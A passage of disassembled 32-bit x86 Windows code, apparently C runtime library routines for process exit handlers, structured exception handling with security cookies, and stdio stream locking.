  404921:	e8 aa 01 00 00       	call   0x404ad0
  404926:	6a 08                	push   $0x8
  404928:	e8 be 23 00 00       	call   0x406ceb
  40492d:	59                   	pop    %ecx
  40492e:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  404932:	33 c0                	xor    %eax,%eax
  404934:	40                   	inc    %eax
  404935:	39 05 a8 0b 41 00    	cmp    %eax,0x410ba8
  40493b:	0f 84 d8 00 00 00    	je     0x404a19
  404941:	a3 a4 0b 41 00       	mov    %eax,0x410ba4
  404946:	8a 45 10             	mov    0x10(%ebp),%al
  404949:	a2 a0 0b 41 00       	mov    %al,0x410ba0
  40494e:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  404952:	0f 85 a0 00 00 00    	jne    0x4049f8
  404958:	ff 35 4c 27 41 00    	push   0x41274c
  40495e:	8b 35 e8 b0 40 00    	mov    0x40b0e8,%esi
  404964:	ff d6                	call   *%esi
  404966:	8b d8                	mov    %eax,%ebx
  404968:	89 5d d0             	mov    %ebx,-0x30(%ebp)
  40496b:	85 db                	test   %ebx,%ebx
  40496d:	74 68                	je     0x4049d7
  40496f:	ff 35 48 27 41 00    	push   0x412748
  404975:	ff d6                	call   *%esi
  404977:	8b f8                	mov    %eax,%edi
  404979:	89 7d d4             	mov    %edi,-0x2c(%ebp)
  40497c:	89 5d dc             	mov    %ebx,-0x24(%ebp)
  40497f:	89 7d d8             	mov    %edi,-0x28(%ebp)
  404982:	83 ef 04             	sub    $0x4,%edi
  404985:	89 7d d4             	mov    %edi,-0x2c(%ebp)
  404988:	3b fb                	cmp    %ebx,%edi
  40498a:	72 4b                	jb     0x4049d7
  40498c:	e8 44 1b 00 00       	call   0x4064d5
  404991:	39 07                	cmp    %eax,(%edi)
  404993:	74 ed                	je     0x404982
  404995:	3b fb                	cmp    %ebx,%edi
  404997:	72 3e                	jb     0x4049d7
  404999:	ff 37                	push   (%edi)
  40499b:	ff d6                	call   *%esi
  40499d:	8b d8                	mov    %eax,%ebx
  40499f:	e8 31 1b 00 00       	call   0x4064d5
  4049a4:	89 07                	mov    %eax,(%edi)
  4049a6:	ff d3                	call   *%ebx
  4049a8:	ff 35 4c 27 41 00    	push   0x41274c
  4049ae:	ff d6                	call   *%esi
  4049b0:	8b d8                	mov    %eax,%ebx
  4049b2:	ff 35 48 27 41 00    	push   0x412748
  4049b8:	ff d6                	call   *%esi
  4049ba:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  4049bd:	75 05                	jne    0x4049c4
  4049bf:	39 45 d8             	cmp    %eax,-0x28(%ebp)
  4049c2:	74 0e                	je     0x4049d2
  4049c4:	89 5d dc             	mov    %ebx,-0x24(%ebp)
  4049c7:	89 5d d0             	mov    %ebx,-0x30(%ebp)
  4049ca:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4049cd:	8b f8                	mov    %eax,%edi
  4049cf:	89 7d d4             	mov    %edi,-0x2c(%ebp)
  4049d2:	8b 5d d0             	mov    -0x30(%ebp),%ebx
  4049d5:	eb ab                	jmp    0x404982
  4049d7:	c7 45 e4 c8 b1 40 00 	movl   $0x40b1c8,-0x1c(%ebp)
  4049de:	81 7d e4 d4 b1 40 00 	cmpl   $0x40b1d4,-0x1c(%ebp)
  4049e5:	73 11                	jae    0x4049f8
  4049e7:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4049ea:	8b 00                	mov    (%eax),%eax
  4049ec:	85 c0                	test   %eax,%eax
  4049ee:	74 02                	je     0x4049f2
  4049f0:	ff d0                	call   *%eax
  4049f2:	83 45 e4 04          	addl   $0x4,-0x1c(%ebp)
  4049f6:	eb e6                	jmp    0x4049de
  4049f8:	c7 45 e0 d8 b1 40 00 	movl   $0x40b1d8,-0x20(%ebp)
  4049ff:	81 7d e0 dc b1 40 00 	cmpl   $0x40b1dc,-0x20(%ebp)
  404a06:	73 11                	jae    0x404a19
  404a08:	8b 45 e0             	mov    -0x20(%ebp),%eax
  404a0b:	8b 00                	mov    (%eax),%eax
  404a0d:	85 c0                	test   %eax,%eax
  404a0f:	74 02                	je     0x404a13
  404a11:	ff d0                	call   *%eax
  404a13:	83 45 e0 04          	addl   $0x4,-0x20(%ebp)
  404a17:	eb e6                	jmp    0x4049ff
  404a19:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  404a20:	e8 20 00 00 00       	call   0x404a45
  404a25:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  404a29:	75 29                	jne    0x404a54
  404a2b:	c7 05 a8 0b 41 00 01 	movl   $0x1,0x410ba8
  404a32:	00 00 00 
  404a35:	6a 08                	push   $0x8
  404a37:	e8 d6 21 00 00       	call   0x406c12
  404a3c:	59                   	pop    %ecx
  404a3d:	ff 75 08             	push   0x8(%ebp)
  404a40:	e8 bd fd ff ff       	call   0x404802
  404a45:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  404a49:	74 08                	je     0x404a53
  404a4b:	6a 08                	push   $0x8
  404a4d:	e8 c0 21 00 00       	call   0x406c12
  404a52:	59                   	pop    %ecx
  404a53:	c3                   	ret
  404a54:	e8 bc 00 00 00       	call   0x404b15
  404a59:	c3                   	ret
  404a5a:	8b ff                	mov    %edi,%edi
  404a5c:	55                   	push   %ebp
  404a5d:	8b ec                	mov    %esp,%ebp
  404a5f:	6a 00                	push   $0x0
  404a61:	6a 00                	push   $0x0
  404a63:	ff 75 08             	push   0x8(%ebp)
  404a66:	e8 af fe ff ff       	call   0x40491a
  404a6b:	83 c4 0c             	add    $0xc,%esp
  404a6e:	5d                   	pop    %ebp
  404a6f:	c3                   	ret
  404a70:	8b ff                	mov    %edi,%edi
  404a72:	55                   	push   %ebp
  404a73:	8b ec                	mov    %esp,%ebp
  404a75:	6a 00                	push   $0x0
  404a77:	6a 01                	push   $0x1
  404a79:	ff 75 08             	push   0x8(%ebp)
  404a7c:	e8 99 fe ff ff       	call   0x40491a
  404a81:	83 c4 0c             	add    $0xc,%esp
  404a84:	5d                   	pop    %ebp
  404a85:	c3                   	ret
  404a86:	6a 01                	push   $0x1
  404a88:	6a 00                	push   $0x0
  404a8a:	6a 00                	push   $0x0
  404a8c:	e8 89 fe ff ff       	call   0x40491a
  404a91:	83 c4 0c             	add    $0xc,%esp
  404a94:	c3                   	ret
  404a95:	6a 01                	push   $0x1
  404a97:	6a 01                	push   $0x1
  404a99:	6a 00                	push   $0x0
  404a9b:	e8 7a fe ff ff       	call   0x40491a
  404aa0:	83 c4 0c             	add    $0xc,%esp
  404aa3:	c3                   	ret
  404aa4:	8b ff                	mov    %edi,%edi
  404aa6:	55                   	push   %ebp
  404aa7:	8b ec                	mov    %esp,%ebp
  404aa9:	e8 db 12 00 00       	call   0x405d89
  404aae:	ff 75 08             	push   0x8(%ebp)
  404ab1:	e8 24 11 00 00       	call   0x405bda
  404ab6:	59                   	pop    %ecx
  404ab7:	68 ff 00 00 00       	push   $0xff
  404abc:	e8 af ff ff ff       	call   0x404a70
  404ac1:	cc                   	int3
  404ac2:	cc                   	int3
  404ac3:	cc                   	int3
  404ac4:	cc                   	int3
  404ac5:	cc                   	int3
  404ac6:	cc                   	int3
  404ac7:	cc                   	int3
  404ac8:	cc                   	int3
  404ac9:	cc                   	int3
  404aca:	cc                   	int3
  404acb:	cc                   	int3
  404acc:	cc                   	int3
  404acd:	cc                   	int3
  404ace:	cc                   	int3
  404acf:	cc                   	int3
  404ad0:	68 30 4b 40 00       	push   $0x404b30
  404ad5:	64 ff 35 00 00 00 00 	push   %fs:0x0
  404adc:	8b 44 24 10          	mov    0x10(%esp),%eax
  404ae0:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  404ae4:	8d 6c 24 10          	lea    0x10(%esp),%ebp
  404ae8:	2b e0                	sub    %eax,%esp
  404aea:	53                   	push   %ebx
  404aeb:	56                   	push   %esi
  404aec:	57                   	push   %edi
  404aed:	a1 b0 f0 40 00       	mov    0x40f0b0,%eax
  404af2:	31 45 fc             	xor    %eax,-0x4(%ebp)
  404af5:	33 c5                	xor    %ebp,%eax
  404af7:	50                   	push   %eax
  404af8:	89 65 e8             	mov    %esp,-0x18(%ebp)
  404afb:	ff 75 f8             	push   -0x8(%ebp)
  404afe:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404b01:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  404b08:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404b0b:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404b0e:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  404b14:	c3                   	ret
  404b15:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404b18:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404b1f:	59                   	pop    %ecx
  404b20:	5f                   	pop    %edi
  404b21:	5f                   	pop    %edi
  404b22:	5e                   	pop    %esi
  404b23:	5b                   	pop    %ebx
  404b24:	8b e5                	mov    %ebp,%esp
  404b26:	5d                   	pop    %ebp
  404b27:	51                   	push   %ecx
  404b28:	c3                   	ret
  404b29:	cc                   	int3
  404b2a:	cc                   	int3
  404b2b:	cc                   	int3
  404b2c:	cc                   	int3
  404b2d:	cc                   	int3
  404b2e:	cc                   	int3
  404b2f:	cc                   	int3
  404b30:	8b ff                	mov    %edi,%edi
  404b32:	55                   	push   %ebp
  404b33:	8b ec                	mov    %esp,%ebp
  404b35:	83 ec 18             	sub    $0x18,%esp
  404b38:	53                   	push   %ebx
  404b39:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  404b3c:	56                   	push   %esi
  404b3d:	8b 73 08             	mov    0x8(%ebx),%esi
  404b40:	33 35 b0 f0 40 00    	xor    0x40f0b0,%esi
  404b46:	57                   	push   %edi
  404b47:	8b 06                	mov    (%esi),%eax
  404b49:	c6 45 ff 00          	movb   $0x0,-0x1(%ebp)
  404b4d:	c7 45 f4 01 00 00 00 	movl   $0x1,-0xc(%ebp)
  404b54:	8d 7b 10             	lea    0x10(%ebx),%edi
  404b57:	83 f8 fe             	cmp    $0xfffffffe,%eax
  404b5a:	74 0d                	je     0x404b69
  404b5c:	8b 4e 04             	mov    0x4(%esi),%ecx
  404b5f:	03 cf                	add    %edi,%ecx
  404b61:	33 0c 38             	xor    (%eax,%edi,1),%ecx
  404b64:	e8 15 e5 ff ff       	call   0x40307e
  404b69:	8b 4e 0c             	mov    0xc(%esi),%ecx
  404b6c:	8b 46 08             	mov    0x8(%esi),%eax
  404b6f:	03 cf                	add    %edi,%ecx
  404b71:	33 0c 38             	xor    (%eax,%edi,1),%ecx
  404b74:	e8 05 e5 ff ff       	call   0x40307e
  404b79:	8b 45 08             	mov    0x8(%ebp),%eax
  404b7c:	f6 40 04 66          	testb  $0x66,0x4(%eax)
  404b80:	0f 85 19 01 00 00    	jne    0x404c9f
  404b86:	8b 4d 10             	mov    0x10(%ebp),%ecx
  404b89:	8d 55 e8             	lea    -0x18(%ebp),%edx
  404b8c:	89 53 fc             	mov    %edx,-0x4(%ebx)
  404b8f:	8b 5b 0c             	mov    0xc(%ebx),%ebx
  404b92:	89 45 e8             	mov    %eax,-0x18(%ebp)
  404b95:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  404b98:	83 fb fe             	cmp    $0xfffffffe,%ebx
  404b9b:	74 5f                	je     0x404bfc
  404b9d:	8d 49 00             	lea    0x0(%ecx),%ecx
  404ba0:	8d 04 5b             	lea    (%ebx,%ebx,2),%eax
  404ba3:	8b 4c 86 14          	mov    0x14(%esi,%eax,4),%ecx
  404ba7:	8d 44 86 10          	lea    0x10(%esi,%eax,4),%eax
  404bab:	89 45 f0             	mov    %eax,-0x10(%ebp)
  404bae:	8b 00                	mov    (%eax),%eax
  404bb0:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404bb3:	85 c9                	test   %ecx,%ecx
  404bb5:	74 14                	je     0x404bcb
  404bb7:	8b d7                	mov    %edi,%edx
  404bb9:	e8 a4 03 00 00       	call   0x404f62
  404bbe:	c6 45 ff 01          	movb   $0x1,-0x1(%ebp)
  404bc2:	85 c0                	test   %eax,%eax
  404bc4:	78 40                	js     0x404c06
  404bc6:	7f 47                	jg     0x404c0f
  404bc8:	8b 45 f8             	mov    -0x8(%ebp),%eax
  404bcb:	8b d8                	mov    %eax,%ebx
  404bcd:	83 f8 fe             	cmp    $0xfffffffe,%eax
  404bd0:	75 ce                	jne    0x404ba0
  404bd2:	80 7d ff 00          	cmpb   $0x0,-0x1(%ebp)
  404bd6:	74 24                	je     0x404bfc
  404bd8:	8b 06                	mov    (%esi),%eax
  404bda:	83 f8 fe             	cmp    $0xfffffffe,%eax
  404bdd:	74 0d                	je     0x404bec
  404bdf:	8b 4e 04             	mov    0x4(%esi),%ecx
  404be2:	03 cf                	add    %edi,%ecx
  404be4:	33 0c 38             	xor    (%eax,%edi,1),%ecx
  404be7:	e8 92 e4 ff ff       	call   0x40307e
  404bec:	8b 4e 0c             	mov    0xc(%esi),%ecx
  404bef:	8b 56 08             	mov    0x8(%esi),%edx
  404bf2:	03 cf                	add    %edi,%ecx
  404bf4:	33 0c 3a             	xor    (%edx,%edi,1),%ecx
  404bf7:	e8 82 e4 ff ff       	call   0x40307e
  404bfc:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404bff:	5f                   	pop    %edi
  404c00:	5e                   	pop    %esi
  404c01:	5b                   	pop    %ebx
  404c02:	8b e5                	mov    %ebp,%esp
  404c04:	5d                   	pop    %ebp
  404c05:	c3                   	ret
  404c06:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  404c0d:	eb c9                	jmp    0x404bd8
  404c0f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404c12:	81 39 63 73 6d e0    	cmpl   $0xe06d7363,(%ecx)
  404c18:	75 29                	jne    0x404c43
  404c1a:	83 3d 24 d4 40 00 00 	cmpl   $0x0,0x40d424
  404c21:	74 20                	je     0x404c43
  404c23:	68 24 d4 40 00       	push   $0x40d424
  404c28:	e8 e3 24 00 00       	call   0x407110
  404c2d:	83 c4 04             	add    $0x4,%esp
  404c30:	85 c0                	test   %eax,%eax
  404c32:	74 0f                	je     0x404c43
  404c34:	8b 55 08             	mov    0x8(%ebp),%edx
  404c37:	6a 01                	push   $0x1
  404c39:	52                   	push   %edx
  404c3a:	ff 15 24 d4 40 00    	call   *0x40d424
  404c40:	83 c4 08             	add    $0x8,%esp
  404c43:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  404c46:	8b 55 08             	mov    0x8(%ebp),%edx
  404c49:	e8 44 03 00 00       	call   0x404f92
  404c4e:	8b 45 0c             	mov    0xc(%ebp),%eax
  404c51:	39 58 0c             	cmp    %ebx,0xc(%eax)
  404c54:	74 12                	je     0x404c68
  404c56:	68 b0 f0 40 00       	push   $0x40f0b0
  404c5b:	57                   	push   %edi
  404c5c:	8b d3                	mov    %ebx,%edx
  404c5e:	8b c8                	mov    %eax,%ecx
  404c60:	e8 46 03 00 00       	call   0x404fab
  404c65:	8b 45 0c             	mov    0xc(%ebp),%eax
  404c68:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  404c6b:	89 48 0c             	mov    %ecx,0xc(%eax)
  404c6e:	8b 06                	mov    (%esi),%eax
  404c70:	83 f8 fe             	cmp    $0xfffffffe,%eax
  404c73:	74 0d                	je     0x404c82
  404c75:	8b 4e 04             	mov    0x4(%esi),%ecx
  404c78:	03 cf                	add    %edi,%ecx
  404c7a:	33 0c 38             	xor    (%eax,%edi,1),%ecx
  404c7d:	e8 fc e3 ff ff       	call   0x40307e
  404c82:	8b 4e 0c             	mov    0xc(%esi),%ecx
  404c85:	8b 56 08             	mov    0x8(%esi),%edx
  404c88:	03 cf                	add    %edi,%ecx
  404c8a:	33 0c 3a             	xor    (%edx,%edi,1),%ecx
  404c8d:	e8 ec e3 ff ff       	call   0x40307e
  404c92:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404c95:	8b 48 08             	mov    0x8(%eax),%ecx
  404c98:	8b d7                	mov    %edi,%edx
  404c9a:	e8 da 02 00 00       	call   0x404f79
  404c9f:	ba fe ff ff ff       	mov    $0xfffffffe,%edx
  404ca4:	39 53 0c             	cmp    %edx,0xc(%ebx)
  404ca7:	0f 84 4f ff ff ff    	je     0x404bfc
  404cad:	68 b0 f0 40 00       	push   $0x40f0b0
  404cb2:	57                   	push   %edi
  404cb3:	8b cb                	mov    %ebx,%ecx
  404cb5:	e8 f1 02 00 00       	call   0x404fab
  404cba:	e9 19 ff ff ff       	jmp    0x404bd8
  404cbf:	a1 40 27 41 00       	mov    0x412740,%eax
  404cc4:	56                   	push   %esi
  404cc5:	6a 14                	push   $0x14
  404cc7:	5e                   	pop    %esi
  404cc8:	85 c0                	test   %eax,%eax
  404cca:	75 07                	jne    0x404cd3
  404ccc:	b8 00 02 00 00       	mov    $0x200,%eax
  404cd1:	eb 06                	jmp    0x404cd9
  404cd3:	3b c6                	cmp    %esi,%eax
  404cd5:	7d 07                	jge    0x404cde
  404cd7:	8b c6                	mov    %esi,%eax
  404cd9:	a3 40 27 41 00       	mov    %eax,0x412740
  404cde:	6a 04                	push   $0x4
  404ce0:	50                   	push   %eax
  404ce1:	e8 24 fa ff ff       	call   0x40470a
  404ce6:	59                   	pop    %ecx
  404ce7:	59                   	pop    %ecx
  404ce8:	a3 20 17 41 00       	mov    %eax,0x411720
  404ced:	85 c0                	test   %eax,%eax
  404cef:	75 1e                	jne    0x404d0f
  404cf1:	6a 04                	push   $0x4
  404cf3:	56                   	push   %esi
  404cf4:	89 35 40 27 41 00    	mov    %esi,0x412740
  404cfa:	e8 0b fa ff ff       	call   0x40470a
  404cff:	59                   	pop    %ecx
  404d00:	59                   	pop    %ecx
  404d01:	a3 20 17 41 00       	mov    %eax,0x411720
  404d06:	85 c0                	test   %eax,%eax
  404d08:	75 05                	jne    0x404d0f
  404d0a:	6a 1a                	push   $0x1a
  404d0c:	58                   	pop    %eax
  404d0d:	5e                   	pop    %esi
  404d0e:	c3                   	ret
  404d0f:	33 d2                	xor    %edx,%edx
  404d11:	b9 30 f2 40 00       	mov    $0x40f230,%ecx
  404d16:	eb 05                	jmp    0x404d1d
  404d18:	a1 20 17 41 00       	mov    0x411720,%eax
  404d1d:	89 0c 02             	mov    %ecx,(%edx,%eax,1)
  404d20:	83 c1 20             	add    $0x20,%ecx
  404d23:	83 c2 04             	add    $0x4,%edx
  404d26:	81 f9 b0 f4 40 00    	cmp    $0x40f4b0,%ecx
  404d2c:	7c ea                	jl     0x404d18
  404d2e:	6a fe                	push   $0xfffffffe
  404d30:	5e                   	pop    %esi
  404d31:	33 d2                	xor    %edx,%edx
  404d33:	b9 40 f2 40 00       	mov    $0x40f240,%ecx
  404d38:	57                   	push   %edi
  404d39:	8b c2                	mov    %edx,%eax
  404d3b:	c1 f8 05             	sar    $0x5,%eax
  404d3e:	8b 04 85 20 16 41 00 	mov    0x411620(,%eax,4),%eax
  404d45:	8b fa                	mov    %edx,%edi
  404d47:	83 e7 1f             	and    $0x1f,%edi
  404d4a:	c1 e7 06             	shl    $0x6,%edi
  404d4d:	8b 04 07             	mov    (%edi,%eax,1),%eax
  404d50:	83 f8 ff             	cmp    $0xffffffff,%eax
  404d53:	74 08                	je     0x404d5d
  404d55:	3b c6                	cmp    %esi,%eax
  404d57:	74 04                	je     0x404d5d
  404d59:	85 c0                	test   %eax,%eax
  404d5b:	75 02                	jne    0x404d5f
  404d5d:	89 31                	mov    %esi,(%ecx)
  404d5f:	83 c1 20             	add    $0x20,%ecx
  404d62:	42                   	inc    %edx
  404d63:	81 f9 a0 f2 40 00    	cmp    $0x40f2a0,%ecx
  404d69:	7c ce                	jl     0x404d39
  404d6b:	5f                   	pop    %edi
  404d6c:	33 c0                	xor    %eax,%eax
  404d6e:	5e                   	pop    %esi
  404d6f:	c3                   	ret
  404d70:	e8 ce 0b 00 00       	call   0x405943
  404d75:	80 3d a0 0b 41 00 00 	cmpb   $0x0,0x410ba0
  404d7c:	74 05                	je     0x404d83
  404d7e:	e8 49 24 00 00       	call   0x4071cc
  404d83:	ff 35 20 17 41 00    	push   0x411720
  404d89:	e8 1d ee ff ff       	call   0x403bab
  404d8e:	59                   	pop    %ecx
  404d8f:	c3                   	ret
  404d90:	8b ff                	mov    %edi,%edi
  404d92:	55                   	push   %ebp
  404d93:	8b ec                	mov    %esp,%ebp
  404d95:	56                   	push   %esi
  404d96:	8b 75 08             	mov    0x8(%ebp),%esi
  404d99:	b8 30 f2 40 00       	mov    $0x40f230,%eax
  404d9e:	3b f0                	cmp    %eax,%esi
  404da0:	72 22                	jb     0x404dc4
  404da2:	81 fe 90 f4 40 00    	cmp    $0x40f490,%esi
  404da8:	77 1a                	ja     0x404dc4
  404daa:	8b ce                	mov    %esi,%ecx
  404dac:	2b c8                	sub    %eax,%ecx
  404dae:	c1 f9 05             	sar    $0x5,%ecx
  404db1:	83 c1 10             	add    $0x10,%ecx
  404db4:	51                   	push   %ecx
  404db5:	e8 31 1f 00 00       	call   0x406ceb
  404dba:	81 4e 0c 00 80 00 00 	orl    $0x8000,0xc(%esi)
  404dc1:	59                   	pop    %ecx
  404dc2:	eb 0a                	jmp    0x404dce
  404dc4:	83 c6 20             	add    $0x20,%esi
  404dc7:	56                   	push   %esi
  404dc8:	ff 15 84 b0 40 00    	call   *0x40b084
  404dce:	5e                   	pop    %esi
  404dcf:	5d                   	pop    %ebp
  404dd0:	c3                   	ret
  404dd1:	8b ff                	mov    %edi,%edi
  404dd3:	55                   	push   %ebp
  404dd4:	8b ec                	mov    %esp,%ebp
  404dd6:	8b 45 08             	mov    0x8(%ebp),%eax
  404dd9:	83 f8 14             	cmp    $0x14,%eax
  404ddc:	7d 16                	jge    0x404df4
  404dde:	83 c0 10             	add    $0x10,%eax
  404de1:	50                   	push   %eax
  404de2:	e8 04 1f 00 00       	call   0x406ceb
  404de7:	8b 45 0c             	mov    0xc(%ebp),%eax
  404dea:	81 48 0c 00 80 00 00 	orl    $0x8000,0xc(%eax)
  404df1:	59                   	pop    %ecx
  404df2:	5d                   	pop    %ebp
  404df3:	c3                   	ret
  404df4:	8b 45 0c             	mov    0xc(%ebp),%eax
  404df7:	83 c0 20             	add    $0x20,%eax
  404dfa:	50                   	push   %eax
  404dfb:	ff 15 84 b0 40 00    	call   *0x40b084
  404e01:	5d                   	pop    %ebp
  404e02:	c3                   	ret
  404e03:	8b ff                	mov    %edi,%edi
  404e05:	55                   	push   %ebp
  404e06:	8b ec                	mov    %esp,%ebp
  404e08:	8b 45 08             	mov    0x8(%ebp),%eax
  404e0b:	b9 30 f2 40 00       	mov    $0x40f230,%ecx
  404e10:	3b c1                	cmp    %ecx,%eax
  404e12:	72 1f                	jb     0x404e33
  404e14:	3d 90 f4 40 00       	cmp    $0x40f490,%eax
  404e19:	77 18                	ja     0x404e33
  404e1b:	81 60 0c ff 7f ff ff 	andl   $0xffff7fff,0xc(%eax)
  404e22:	2b c1                	sub    %ecx,%eax
  404e24:	c1 f8 05             	sar    $0x5,%eax
  404e27:	83 c0 10             	add    $0x10,%eax
  404e2a:	50                   	push   %eax
  404e2b:	e8 e2 1d 00 00       	call   0x406c12
  404e30:	59                   	pop    %ecx
  404e31:	5d                   	pop    %ebp
  404e32:	c3                   	ret
  404e33:	83 c0 20             	add    $0x20,%eax
  404e36:	50                   	push   %eax
  404e37:	ff 15 88 b0 40 00    	call   *0x40b088
  404e3d:	5d                   	pop    %ebp
  404e3e:	c3                   	ret
  404e3f:	8b ff                	mov    %edi,%edi
  404e41:	55                   	push   %ebp
  404e42:	8b ec                	mov    %esp,%ebp
  404e44:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404e47:	8b 45 0c             	mov    0xc(%ebp),%eax
  404e4a:	83 f9 14             	cmp    $0x14,%ecx
  404e4d:	7d 13                	jge    0x404e62
  404e4f:	81 60 0c ff 7f ff ff 	andl   $0xffff7fff,0xc(%eax)
  404e56:	83 c1 10             	add    $0x10,%ecx
  404e59:	51                   	push   %ecx
  404e5a:	e8 b3 1d 00 00       	call   0x406c12
  404e5f:	59                   	pop    %ecx
  404e60:	5d                   	pop    %ebp
  404e61:	c3                   	ret
  404e62:	83 c0 20             	add    $0x20,%eax
  404e65:	50                   	push   %eax
  404e66:	ff 15 88 b0 40 00    	call   *0x40b088
  404e6c:	5d                   	pop    %ebp
  404e6d:	c3                   	ret
  404e6e:	cc                   	int3
  404e6f:	cc                   	int3
  404e70:	53                   	push   %ebx
  404e71:	56                   	push   %esi
  404e72:	57                   	push   %edi
  404e73:	8b 54 24 10          	mov    0x10(%esp),%edx
  404e77:	8b 44 24 14          	mov    0x14(%esp),%eax
  404e7b:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  404e7f:	55                   	push   %ebp
  404e80:	52                   	push   %edx
  404e81:	50                   	push   %eax
  404e82:	51                   	push   %ecx
  404e83:	51                   	push   %ecx
  404e84:	68 00 4f 40 00       	push   $0x404f00
  404e89:	64 ff 35 00 00 00 00 	push   %fs:0x0
  404e90:	a1 b0 f0 40 00       	mov    0x40f0b0,%eax
  404e95:	33 c4                	xor    %esp,%eax
  404e97:	89 44 24 08          	mov    %eax,0x8(%esp)
  404e9b:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  404ea2:	8b 44 24 30          	mov    0x30(%esp),%eax
  404ea6:	8b 58 08             	mov    0x8(%eax),%ebx
  404ea9:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  404ead:	33 19                	xor    (%ecx),%ebx
  404eaf:	8b 70 0c             	mov    0xc(%eax),%esi
  404eb2:	83 fe fe             	cmp    $0xfffffffe,%esi
  404eb5:	74 3b                	je     0x404ef2
  404eb7:	8b 54 24 34          	mov    0x34(%esp),%edx
  404ebb:	83 fa fe             	cmp    $0xfffffffe,%edx
  404ebe:	74 04                	je     0x404ec4
  404ec0:	3b f2                	cmp    %edx,%esi
  404ec2:	76 2e                	jbe    0x404ef2
  404ec4:	8d 34 76             	lea    (%esi,%esi,2),%esi
  404ec7:	8d 5c b3 10          	lea    0x10(%ebx,%esi,4),%ebx
  404ecb:	8b 0b                	mov    (%ebx),%ecx
  404ecd:	89 48 0c             	mov    %ecx,0xc(%eax)
  404ed0:	83 7b 04 00          	cmpl   $0x0,0x4(%ebx)
  404ed4:	75 cc                	jne    0x404ea2
  404ed6:	68 01 01 00 00       	push   $0x101
  404edb:	8b 43 08             	mov    0x8(%ebx),%eax
  404ede:	e8 a2 24 00 00       	call   0x407385
  404ee3:	b9 01 00 00 00       	mov    $0x1,%ecx
  404ee8:	8b 43 08             	mov    0x8(%ebx),%eax
  404eeb:	e8 b4 24 00 00       	call   0x4073a4
  404ef0:	eb b0                	jmp    0x404ea2
  404ef2:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  404ef9:	83 c4 18             	add    $0x18,%esp
  404efc:	5f                   	pop    %edi
  404efd:	5e                   	pop    %esi
  404efe:	5b                   	pop    %ebx
  404eff:	c3                   	ret
  404f00:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  404f04:	f7 41 04 06 00 00 00 	testl  $0x6,0x4(%ecx)
  404f0b:	b8 01 00 00 00       	mov    $0x1,%eax
  404f10:	74 33                	je     0x404f45
  404f12:	8b 44 24 08          	mov    0x8(%esp),%eax
  404f16:	8b 48 08             	mov    0x8(%eax),%ecx
  404f19:	33 c8                	xor    %eax,%ecx
  404f1b:	e8 5e e1 ff ff       	call   0x40307e
  404f20:	55                   	push   %ebp
  404f21:	8b 68 18             	mov    0x18(%eax),%ebp
  404f24:	ff 70 0c             	push   0xc(%eax)
  404f27:	ff 70 10             	push   0x10(%eax)
  404f2a:	ff 70 14             	push   0x14(%eax)
  404f2d:	e8 3e ff ff ff       	call   0x404e70
  404f32:	83 c4 0c             	add    $0xc,%esp
  404f35:	5d                   	pop    %ebp
  404f36:	8b 44 24 08          	mov    0x8(%esp),%eax
  404f3a:	8b 54 24 10          	mov    0x10(%esp),%edx
  404f3e:	89 02                	mov    %eax,(%edx)
  404f40:	b8 03 00 00 00       	mov    $0x3,%eax
  404f45:	c3                   	ret
  404f46:	55                   	push   %ebp
  404f47:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  404f4b:	8b 29                	mov    (%ecx),%ebp
  404f4d:	ff 71 1c             	push   0x1c(%ecx)
  404f50:	ff 71 18             	push   0x18(%ecx)
  404f53:	ff 71 28             	push   0x28(%ecx)
  404f56:	e8 15 ff ff ff       	call   0x404e70
  404f5b:	83 c4 0c             	add    $0xc,%esp
  404f5e:	5d                   	pop    %ebp
  404f5f:	c2 04 00             	ret    $0x4
  404f62:	55                   	push   %ebp
  404f63:	56                   	push   %esi
  404f64:	57                   	push   %edi
  404f65:	53                   	push   %ebx
  404f66:	8b ea                	mov    %edx,%ebp
  404f68:	33 c0                	xor    %eax,%eax
  404f6a:	33 db                	xor    %ebx,%ebx
  404f6c:	33 d2                	xor    %edx,%edx
  404f6e:	33 f6                	xor    %esi,%esi
  404f70:	33 ff                	xor    %edi,%edi
  404f72:	ff d1                	call   *%ecx
  404f74:	5b                   	pop    %ebx
  404f75:	5f                   	pop    %edi
  404f76:	5e                   	pop    %esi
  404f77:	5d                   	pop    %ebp
  404f78:	c3                   	ret
  404f79:	8b ea                	mov    %edx,%ebp
  404f7b:	8b f1                	mov    %ecx,%esi
  404f7d:	8b c1                	mov    %ecx,%eax
  404f7f:	6a 01                	push   $0x1
  404f81:	e8 ff 23 00 00       	call   0x407385
  404f86:	33 c0                	xor    %eax,%eax
  404f88:	33 db                	xor    %ebx,%ebx
  404f8a:	33 c9                	xor    %ecx,%ecx
  404f8c:	33 d2                	xor    %edx,%edx
  404f8e:	33 ff                	xor    %edi,%edi
